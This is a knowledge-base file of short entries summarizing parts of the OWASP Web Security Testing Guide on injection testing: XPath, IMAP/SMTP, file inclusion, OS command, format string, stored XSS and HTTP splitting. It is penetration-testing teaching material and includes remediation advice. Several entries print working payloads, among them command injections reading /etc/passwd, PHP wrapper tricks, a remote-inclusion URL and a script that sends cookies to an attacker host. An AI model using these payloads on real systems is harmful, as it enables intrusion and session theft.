{"id": "kb-001275", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "An example scenario is presented involving a login page with an XML representation of users, illustrating how input can be manipulated to test for vulnerabilities."}
{"id": "kb-001276", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "XPath Query Example: An example of an XPath query provided is: string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())."}
{"id": "kb-001277", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Injection Example: A tester can exploit the application by injecting values such as Username: ' or '1' = '1 and Password: ' or '1' = '1, turning the query into: string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())."}
{"id": "kb-001278", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Analysis of Injection: The injected parameters create a query that always evaluates to true, allowing the attacker to authenticate without valid credentials. This is analogous to common SQL Injection exploits."}
{"id": "kb-001279", "section": null, "tags": ["INFO", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Blind XPath Injection: In cases where error messages are not helpful, a Blind XPath Injection attack can be used to reconstruct the XML data structure bit by bit. This technique is similar to inference-based SQL Injection. Suggested Reading: Amit Klein's work 'Blind XPath Injection' is recommended for more in-depth understanding of the topic."}
{"id": "kb-001280", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "**IMAP/SMTP Injection Threat**: This threat affects all applications that communicate with mail servers, particularly webmail applications, and can occur due to improper sanitization of input data."}
{"id": "kb-001281", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Testing Purpose**: The objective of this test is to verify if it's possible to inject arbitrary IMAP/SMTP commands into mail servers, which can lead to significant security vulnerabilities."}
{"id": "kb-001282", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Direct Testing Recommendation**: If full communication with the backend mail server is available, direct testing is recommended for more effective results. This is particularly relevant when the mail server is not exposed to the Internet but may still be accessible internally."}
{"id": "kb-001283", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Vulnerabilities in Internal Systems**: Internal mail servers may not be as secure as front-end web servers, making them potentially more vulnerable to injection attacks."}
{"id": "kb-001284", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "**Examples of Attacks**: Potential attacks due to IMAP/SMTP Injection include exploitation of protocol vulnerabilities, application restriction evasion, anti-automation process evasion, information leaks, and relay/SPAM."}
{"id": "kb-001285", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Test Objectives**: Key objectives include identifying IMAP/SMTP injection points and understanding the data flow and deployment structure of the system."}
{"id": "kb-001286", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "**Figure Reference**: The described figure illustrates the traffic flow between the user, the webmail client, and the backend mail servers, capturing the steps involved in both regular use and testing scenarios. To identify vulnerable parameters in web applications, testers send malicious requests to analyze how the application handles input."}
{"id": "kb-001287", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In secure applications, erroneous input should produce an error response, while vulnerable applications may process the malicious request and return HTTP 200 OK responses."}
{"id": "kb-001288", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Testing must be appropriate to the technology in use, avoiding mismatches (e.g., sending SQL injection strings suitable for one database type to another may yield false positives). For IMAP testing, key parameters include: mailbox, passed_id, startMessage, destination email, message body, and attached files. Example of a URL for testing mailbox parameter: http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46106&startMessage=1."}
{"id": "kb-001289", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Testing manipulations can involve: assigning a null value, substituting with a random value, adding extra parameters, including non-standard special characters, or eliminating the parameter altogether."}
{"id": "kb-001290", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The outcomes of the tests can lead to three potential situations: S1 - Application returns an error code/message; S2 - Application does not return an error code/message, but operation fails; S3 - Application operates normally without error."}
{"id": "kb-001291", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Situations S1 and S2 indicate successful attempts of IMAP/SMTP injection where S1 represents a confirmed vulnerability to injection attacks."}
{"id": "kb-001292", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An attacker can manipulate the HTTP request to check for vulnerabilities; for example, altering the 'mailbox' parameter by adding URL encoded characters (\"%22\")."}
{"id": "kb-001293", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A successful injection may lead to an error response such as 'ERROR: Bad or malformed request' which can provide insight into server response and potential vulnerabilities."}
{"id": "kb-001294", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To effectively test for vulnerabilities, the tester must identify vulnerable parameters (e.g., 'passed_id') and assess which type of injection is possible."}
{"id": "kb-001295", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The testing methodology involves crafting specific requests to probe the application, like supplying an alphabetic string where a numeric value is expected, which can lead to informative server errors."}
{"id": "kb-001296", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Understanding the data flow and deployment structure of a web-based application is critical in planning and designing a thorough and exploitable testing strategy."}
{"id": "kb-001297", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When testing web applications, if error messages are not descriptive, testers must deduce possible commands and parameters associated with the application's functionality. For example, in a vulnerable create mailbox functionality, the affected IMAP command is likely 'CREATE.' The CREATE command in IMAP accepts one parameter, which specifies the name of the mailbox to create."}
{"id": "kb-001298", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "IMAP/SMTP command injection involves understanding the expected parameters and command structure. Testers must identify whether injection is possible in an unauthenticated or authenticated state during exploitation. In an unauthenticated state, limited IMAP commands such as 'CAPABILITY', 'NOOP', 'AUTHENTICATE', 'LOGIN', and 'LOGOUT' can be injected. In an authenticated state, the exploitation requires the user to be fully authenticated before proceeding with testing."}
{"id": "kb-001299", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The typical structure of an IMAP/SMTP injection includes three parts: the Header (end of the expected command), the Body (injected new command), and the Footer (beginning of the expected command). To execute IMAP/SMTP commands, the previous command must be terminated with the CRLF sequence (%0d%0a)."}
{"id": "kb-001300", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "For example, if the parameter 'message_id' is detected as vulnerable in a request, the exploitation could look like: http://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791, generating the commands FETCH 4791 BODY[HEADER], V100 CAPABILITY, and V101 FETCH 4791 BODY[HEADER]."}
{"id": "kb-001301", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Code Injection Testing: This section focuses on how to test if code can be injected as input on web applications, potentially being executed by the web server."}
{"id": "kb-001302", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test Objectives: Key objectives include identifying injection points where code can be inserted into the application and assessing the severity of such injections."}
{"id": "kb-001303", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Black-Box Testing: In this method, a tester demonstrates PHP Injection Vulnerabilities by submitting a query string containing a malicious URL that can be included in a PHP page's execution context."}
{"id": "kb-001304", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of PHP Injection: The URL provided (http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a) showcases a scenario where a malicious URL is accepted as part of the parameters for execution."}
{"id": "kb-001305", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Gray-Box Testing: This technique involves examining the server-side code (e.g., ASP) for vulnerabilities related to user input. The tester assesses if user input can be executed in specific functions."}
{"id": "kb-001306", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "ASP Code Example: The ASP code snippet shows how user input can be saved to a text file and executed, highlighting a vulnerability where a user could enter commands that are subsequently executed by the server. File Inclusion vulnerability allows attackers to include files by exploiting dynamic file inclusion mechanisms in applications. The vulnerability arises from user-supplied input being used without proper validation. Potential consequences of File Inclusion vulnerabilities include: 1. Code execution on the web server 2. Client-side code execution which can lead to cross-site scripting (XSS) 3. Denial of Service (DoS) 4. Sensitive Information Disclosure Local File Inclusion (LFI) allows including files already present on the server through vulnerable inclusion procedures."}
{"id": "kb-001307", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "LFI vulnerabilities occur when file paths passed to include statements are not properly sanitized, permitting directory traversal characters (e.g., dot-dot-slash) to be injected. LFI is commonly found in various technologies, including PHP, JSP, and ASP, not just limited to PHP scripts."}
{"id": "kb-001308", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In blackbox testing, one should look for scripts that accept filenames as parameters for possible LFI exploitation, such as: http://vulnerable_host/preview.php?file=example.html"}
{"id": "kb-001309", "section": null, "tags": ["AUTHN", "HTTP", "PATH"], "source": "wstg-v4.2.pdf", "text": "Example of a proof-of-concept attack: http://vulnerable_host/preview.php?file=../../../../etc/passwd to reveal sensitive files like the password file on Unix-like systems."}
{"id": "kb-001310", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The output of a successful LFI exploit might show sensitive system information, such as user accounts and shell details from the /etc/passwd file. Simple substitution with a random filename does not work as .php is appended to the input."}
{"id": "kb-001311", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Null Byte Injection involves using the null character (\\0) to terminate a string, effectively ignoring any characters after it. Example: using the URL encoded string %00 in a file path can lead to exploitation."}
{"id": "kb-001312", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Path and Dot Truncation refers to the behavior of PHP truncating file names longer than 4096 bytes, allowing attackers to bypass the .php extension by exceeding this length."}
{"id": "kb-001313", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "PHP Wrappers allow Local File Inclusion (LFI) vulnerabilities to escalate to Remote Code Execution (RCE), particularly when certain wrappers are involved."}
{"id": "kb-001314", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "PHP Filter is a wrapper that prevents the execution of files while allowing content access, useful for reading sensitive data. Example usage: php://filter/convert.base64-encode/resource=FILE returns base64 encoded content."}
{"id": "kb-001315", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The zip:// wrapper, introduced in PHP 7.2.0, allows manipulation of zip compressed files, requiring a specific parameter structure for access."}
{"id": "kb-001316", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "An example of exploiting a PHP file upload vulnerability involves using a ZIP file upload to bypass file extension validation. The process includes creating a PHP file (e.g., <?php phpinfo(); ?>) and compressing it into a ZIP file that is renamed to an image file extension, allowing it to be uploaded as an avatar."}
{"id": "kb-001317", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The PHP ZIP wrapper can be exploited by injecting a payload formatted as zip://path_to_file%23file_name, where %23 represents the hash (#) character. This can execute PHP code within a ZIP file when accessed through a vulnerable URL."}
{"id": "kb-001318", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To exploit a Local File Inclusion (LFI) vulnerability using the PHP data wrapper, the executable code must be Base64 encoded. For example, the PHP info code is encoded to PD9waHAgcGhwaW5mbygpOyA/Pg==, and used in the format data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==."}
{"id": "kb-001319", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The PHP Expect wrapper, which accesses BASH commands, can be used in the format expect://command but is disabled by default in PHP installations. It allows the execution of commands and capture of their output in stdio, stdout, and stderr."}
{"id": "kb-001320", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A key remediation strategy for file inclusion vulnerabilities is to avoid passing user-supplied input to filesystem APIs. If this isn’t feasible, implement an allow list of files that are safe to include, effectively rejecting any request with an invalid identifier. Specific tools for testing Local File Inclusion vulnerabilities include kadimus, LFI Suite, and OWASP ZAP (Zed Attack Proxy)."}
{"id": "kb-001321", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Remote File Inclusion (RFI) vulnerabilities allow attackers to include a file through exploiting dynamic file inclusion mechanisms in applications."}
{"id": "kb-001322", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "RFI vulnerabilities arise from using user-supplied input without proper validation, potentially leading to various attacks and consequences: 1. Code execution on the web server, 2. Client-side code execution (e.g., JavaScript) leading to Cross Site Scripting (XSS), 3. Denial of Service (DoS), 4. Sensitive Information Disclosure. RFI is often associated with PHP scripts but can also occur in other technologies such as JSP and ASP."}
{"id": "kb-001323", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of vulnerable PHP code is: `$incfile = $_REQUEST[\"file\"]; include($incfile.\".php\");` which takes a filename from user input and includes it without validation, making it susceptible to RFI attacks."}
{"id": "kb-001324", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A practical example of an exploit is: `http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page`, where the attacker specifies a remote file to be included."}
{"id": "kb-001325", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To test for RFI, look for scripts that take filenames as parameters and do not perform input validation, following a black-box testing approach."}
{"id": "kb-001326", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The best remediation for file inclusion vulnerabilities is to avoid using user-provided input in file inclusion operations altogether. Alternatively, maintain an allow list of safe files that can be included and use safe identifiers to access them, rejecting any requests with invalid identifiers."}
{"id": "kb-001327", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "OS command injection allows attackers to execute operating system commands through a web application interface that improperly handles user input. Applications must be designed with security in mind to prevent OS command injection vulnerabilities."}
{"id": "kb-001328", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A common method to test for OS command injection includes manipulating the URL parameters, such as appending a pipe symbol (|) or semicolon (;)."}
{"id": "kb-001329", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example before modification: `http://sensitive/cgi-bin/userData.pl?doc=user1.txt`. Example after modification for command injection: `http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`, which executes the command `/bin/ls`."}
{"id": "kb-001330", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "When testing PHP pages, one can append a semicolon followed by an operating system command. For example, the encoded URL `http://sensitive/something.php?dir=%3Bcat%20/etc/passwd` executes the command `cat /etc/passwd`."}
{"id": "kb-001331", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "It helps to use personal proxies like ZAP or Burp Suite to intercept and modify requests for testing these vulnerabilities, exemplified by the POST HTTP request structure provided. In web security, the post request can be exploited for OS command injection if the application does not validate the input correctly."}
{"id": "kb-001332", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example of a POST request that includes potential OS command injection is shown, where a malicious command was included as part of the data being sent to the server."}
{"id": "kb-001333", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When the POST request is executed without proper validation, the attacker can run system commands on the server, resulting in unauthorized access to system files and information."}
{"id": "kb-001334", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The command `cmd.exe /c type \"C:\\httpd\\public\\doc\\Doc=Doc1.pdf+|+Dir c:\\'` is an example where command injection is demonstrated by attempting to retrieve system directory information."}
{"id": "kb-001335", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Special characters used for command injection include |, ;, &, $, >, <, ', and !. These characters allow multiple commands to be executed based on how they are structured in the injection attempt: `cmd1|cmd2`: Executes cmd2 regardless of whether cmd1 is successful. `cmd1;cmd2`: Similarly executes cmd2 after cmd1, again regardless of the success of cmd1."}
{"id": "kb-001336", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Command execution can be controlled using operators: 'cmd1||cmd2' executes command 2 if command 1 fails, while 'cmd1&&cmd2' executes command 2 if command 1 succeeds."}
{"id": "kb-001337", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The command substitution syntax '$(cmd)' runs a command and substitutes its output; for example, 'echo $(whoami)' prints the name of the current user."}
{"id": "kb-001338", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In the context of security, certain programming APIs are identified as potentially dangerous and may lead to command injection vulnerabilities, including: - Java: Runtime.exec() - C/C++: system, exec, ShellExecute - Python: exec, eval, os.system, os.popen, subprocess.popen, subprocess.call - PHP: system, shell_exec, exec, proc_open, eval"}
{"id": "kb-001339", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Remediation strategies to prevent command injection include sanitization of user inputs by eliminating invalid characters, using an allow list of permissible characters, and having a denial list of characters known to pose risks, such as '|', ';', '&', '$', '>', '<', and others. For effective sanitization, it is suggested to escape or filter special characters specific to the operating systems, such as: - Windows: ( ) < > & * ' | = ? ; [ ] ^ ~ ! . \" % @ / \\ + , ` - Linux: { } ( ) > < & * ' | = ? ; [ ] $ – # ~ ! . \" % / \\ : + , `"}
{"id": "kb-001340", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Web applications should operate under strict permissions that restrict unnecessary access, especially regarding the execution of operating system commands, suggesting a need for gray-box testing methodologies. A format string is a null-terminated character sequence containing conversion specifiers interpreted at runtime."}
{"id": "kb-001341", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Format string vulnerabilities occur when user input is concatenated with a format string, leading to potential runtime errors, information disclosure, or buffer overflows. Languages that do not check arguments and include the %n specifier are particularly vulnerable, allowing attackers to write to memory. C and C++ functions such as printf and similar methods (fprintf, sprintf, snprintf) are susceptible to format string vulnerabilities. In Perl, printf and sprintf can also be exploited for information disclosure by modifying format strings to output unintended values."}
{"id": "kb-001342", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Python versions 2.6 and 2.7 can have vulnerabilities through str.format, and Python 3's unicode str.format can similarly be exploited when injected strings point to other memory variables. Java's String.format and PrintStream.format can cause runtime errors if conversion specifiers are added by an attacker. PHP's printf function is also at risk when it involves unsanitized user input."}
{"id": "kb-001343", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The classic code pattern creating a format string vulnerability involves calling a string format function with user-controlled input, as shown in the code examples."}
{"id": "kb-001344", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of vulnerable C code: `char *userName = /* input from user controlled field */; printf(userName);` This would allow an attacker to manipulate the output by providing conversion specifiers in `userName`."}
{"id": "kb-001345", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of vulnerable Java code: `final String userName = /* input from user controlled field */; System.out.printf(userName);` This could also reveal memory contents and lead to adverse effects depending on the input."}
{"id": "kb-001346", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Injecting format string conversion specifiers into user-controlled fields can lead to undesired behavior in applications, including crashes or exceptions like IllegalFormatException. To test for format string vulnerabilities, one should assess code and inject conversion specifiers as user input."}
{"id": "kb-001347", "section": null, "tags": ["BUSINESS"], "source": "wstg-v4.2.pdf", "text": "Static analysis tools can identify format string vulnerabilities in code or binaries. Examples include: Flawfinder for C/C++, FindSecurityBugs for Java (rule FORMAT_STRING_MANIPULATION), and String formatter Analyzer in phpsa for PHP."}
{"id": "kb-001348", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Manual code inspection is essential since static analysis may miss more complex cases where format strings are generated by intricate code logic."}
{"id": "kb-001349", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "During testing, conversion specifiers should be injected into any string input at the unit test or system test level. Fuzzing the program using various conversion specifiers from all languages utilized by the application can reveal vulnerabilities."}
{"id": "kb-001350", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "If an application is vulnerable to conversion specifier injection, it may crash, show unexpected output, or result in errors such as java.util.MissingFormatArgumentException for Java implementations or a Segmentation Fault for C implementations."}
{"id": "kb-001351", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When testing URLs containing conversion specifiers, one must encode special characters. For example, the encoded form of '%s' becomes '%25s'."}
{"id": "kb-001352", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example testing URL is: https://vulnerable_host/userinfo?username=%25s%25s%25s%25n, which can demonstrate the vulnerability if it returns an error such as an HTTP 500 code."}
{"id": "kb-001353", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Fuzzing is a testing technique used to discover security vulnerabilities in applications by injecting random data into inputs. Tools like wfuzz automate this process. The fuzz.txt file used in fuzzing contains various input lines: 1. A valid input like 'alice' to confirm normal processing by the application. 2. C-like conversion specifiers, such as '%s%s%s%n', which can be used to probe for vulnerabilities."}
{"id": "kb-001354", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "3. Python-specific conversion specifiers to attempt accessing global variables, exemplified by '{event.__init__.__globals__[CONFIG][SECRET_KEY]}'."}
{"id": "kb-001355", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The command to run wfuzz with the specified input file is: wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ. This command sends the fuzzing inputs to the web application."}
{"id": "kb-001356", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The '-c' flag indicates colorful output, '-z file,fuzz.txt' specifies the input file, and 'urlencode' ensures the inputs are properly escaped for the URL."}
{"id": "kb-001357", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Command output illustrates how different payloads generate different responses from the server, indicating potential vulnerabilities. For instance, responses associated with the payloads '%25s%25s%25s%25n' and '%25p%25p%25p%25p%25p' suggest the application's susceptibility to C-like conversion specifiers."}
{"id": "kb-001358", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Incubated vulnerabilities are complex testing methods often referred to as persistent attacks, requiring multiple data validation vulnerabilities to be effective."}
{"id": "kb-001359", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "These vulnerabilities are used in 'watering hole' attacks against users of legitimate web applications, meaning attackers exploit trusted sites to target users."}
{"id": "kb-001360", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The attack vector must be persisted and stored in a persistence layer, which typically occurs due to weak data validation or by input via backend processes."}
{"id": "kb-001361", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Successful execution of an attack vector, such as an incubated XSS attack, relies on weak output validation to deliver scripts in executable form to the client."}
{"id": "kb-001362", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Attackers exploit vulnerabilities in web applications to plant data that can be retrieved by unsuspecting users, leading to broader attacks on multiple victims. Incubated attacks can help assess the criticality of bugs by enabling client-side attacks that target many users simultaneously."}
{"id": "kb-001363", "section": null, "tags": ["CLIENT", "UPLOAD", "XSS"], "source": "wstg-v4.2.pdf", "text": "Various attack vectors include file upload components allowing malicious files, cross-site scripting in public forums, and SQL/XPath injection that enables the execution of arbitrary JavaScript."}
{"id": "kb-001364", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "An archetypical incubated attack often occurs in user forums or blogs, where JavaScript is injected and later executed in users' browsers, leveraging the trust established with the original site."}
{"id": "kb-001365", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives for incubated vulnerabilities involve identifying stored injections, understanding recall mechanisms, and activating listeners to initiate the recall process."}
{"id": "kb-001366", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Black-box testing involves verifying the allowed content types for file uploads and ensuring that the uploaded file, when viewed or downloaded by a user, can exploit components on their workstation."}
{"id": "kb-001367", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "For a black-box test, an example includes sending a malicious file to a victim, which triggers an exploit when they visit the resultant URL."}
{"id": "kb-001368", "section": null, "tags": ["CLIENT", "SESSION", "XSS"], "source": "wstg-v4.2.pdf", "text": "A Cross-Site Scripting (XSS) attack can be demonstrated by injecting JavaScript into a vulnerable field, which allows an attack to retrieve user cookies and send them to an attacker's server."}
{"id": "kb-001369", "section": null, "tags": ["HTTP", "SESSION", "XSS"], "source": "wstg-v4.2.pdf", "text": "Example of XSS attack: <script>document.write('<img src=\"http://attackers.site/cv.jpg?'+document.cookie+'\">')</script>. When users load the vulnerable page, their cookies are sent to the attacker's site, allowing impersonation."}
{"id": "kb-001370", "section": null, "tags": ["SQLI", "XSS"], "source": "wstg-v4.2.pdf", "text": "SQL Injection examples often involve leveraging XSS vulnerabilities. Testers check if the target site is susceptible to SQL injection by attempting to execute unauthorized queries."}
{"id": "kb-001371", "section": null, "tags": ["CLIENT", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "An example query that could be injected includes: `UPDATE footer SET notice = 'Copyright 1999-2030%20<script>document.write('<img src=\"http://attackers.site/cv.jpg?'+document.cookie+'\">')</script>' WHERE notice = 'Copyright 1999-2030';`, which changes the database content to include malicious JavaScript."}
{"id": "kb-001372", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Misconfigured servers, such as those using Apache Tomcat without strong credentials, can allow attackers to upload malicious files and deploy web applications that execute code on the server."}
{"id": "kb-001373", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An attacker may upload a WAR file onto a server with weak access controls, leading to the ability to execute arbitrary code and implant malicious applications accessible by legitimate users."}
{"id": "kb-001374", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The ability to change web page contents at the server can be exploited through vulnerabilities that grant webroot write permissions, enabling attackers to perform injection attacks. Gray-box and white-box testing techniques are crucial for examining security vulnerabilities, specifically input validation."}
{"id": "kb-001375", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Input validation is critical for mitigating vulnerabilities, as poor validation can lead to security weaknesses in systems that share the same persistence layer."}
{"id": "kb-001376", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "To protect against client-side attacks, output validation should be employed to ensure that tainted data is encoded before displaying it to the client, preventing execution of malicious scripts. Tools used for testing web security include XSS-proxy, OWASP Zed Attack Proxy (ZAP), Burp Suite, and Metasploit."}
{"id": "kb-001377", "section": null, "tags": ["SQLI", "XSS"], "source": "wstg-v4.2.pdf", "text": "Incubated attacks are executed by combining exploits such as Cross-site Scripting (XSS) and SQL injection, underscoring the need for comprehensive security measures."}
{"id": "kb-001378", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "HTTP Splitting is an attack that exploits a lack of input sanitization, allowing the insertion of CR (Carriage Return) and LF (Line Feed) characters into response headers, resulting in the splitting of a single HTTP response into multiple messages. The primary goal of HTTP Splitting may include cache poisoning and cross-site scripting attacks."}
{"id": "kb-001379", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTP Smuggling exploits inconsistencies in how different agents (such as web servers and proxies) interpret specially crafted HTTP messages, which can lead to various forms of attack depending on the context of those messages."}
{"id": "kb-001380", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing for HTTP Splitting involves checking web applications that utilize user input to generate header values, especially in cases like URL redirection based on user choices."}
{"id": "kb-001381", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example provided illustrates a scenario where a user can manipulate an 'interface' parameter in a URL redirection, potentially injecting a CRLF sequence (%0d%0a) that splits the response into two parts, which can manipulate the response received by a web cache or browser. It is critical to filter user inputs that could lead to malformed HTTP header responses to mitigate these vulnerabilities."}
{"id": "kb-001382", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of HTTP response manipulation demonstrates how an attacker can exploit web cache vulnerabilities by injecting a CR+LF sequence in user-controlled inputs that influence response headers."}
{"id": "kb-001383", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "A specific case shows that if an attacker manipulates the Location header, it can cause a web cache to serve incorrect content (e.g., \"system down\" message) to all users accessing a specific page through that cache. Two key headers that are candidates for such attacks are: Location and Set-Cookie. Successfully exploiting these vulnerabilities involves careful manipulation of headers to ensure caching aligns with the attacker's goal."}
{"id": "kb-001384", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Some techniques for exploiting the vulnerability include setting a Last-Modified header with a future date and destroying previous cached versions using Pragma: no-cache."}
{"id": "kb-001385", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The application's filtering behavior is crucial—while it may not filter CR+LF sequences, it may still filter out necessary characters or sequence combinations for an effective exploit, which sometimes requires alternative encodings such as UTF-7."}
{"id": "kb-001386", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Understanding how different web application platforms handle HTTP message boundaries is vital for successful exploitation, as these can differ by platform, impacting how CR+LF sequences are processed."}
{"id": "kb-001387", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTP Smuggling is an attack that exploits the different ways HTTP messages can be parsed by various components such as browsers and web application firewalls. It was first discovered in 2005 by Chaim Linhart and others."}
